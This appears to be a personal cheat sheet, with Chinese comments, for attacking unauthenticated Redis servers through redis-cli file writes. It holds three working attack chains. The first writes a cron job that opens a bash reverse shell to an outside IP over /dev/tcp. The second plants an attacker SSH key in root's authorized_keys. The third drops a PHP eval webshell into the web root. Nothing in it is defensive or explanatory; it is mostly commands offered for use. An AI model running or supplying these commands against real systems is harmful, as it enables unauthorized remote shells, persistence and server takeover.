# 失败了 redis-cli.exe -h xx -p 63300
.\redis-cli.exe -h 192.168.127.131
config set dir /var/spool/cron/crontabs
set -.- "\n\n\nbash -c 'bash -i >& /dev/tcp/192.168.50.161/5555 0>&1'\n\n\n"
config set dbfilename root
save






# 2. root身份 可写入 ssh
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x " AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx"
save

# 2.2 写入 ssh
redis > FLUSHALL
sh$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
sh$ cat key.txt | redis-cli -h 172.16.186.4 -x set crackit
config set dir /root/.ssh/
config set dbfilename authorized_keys


# 3. 写webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save

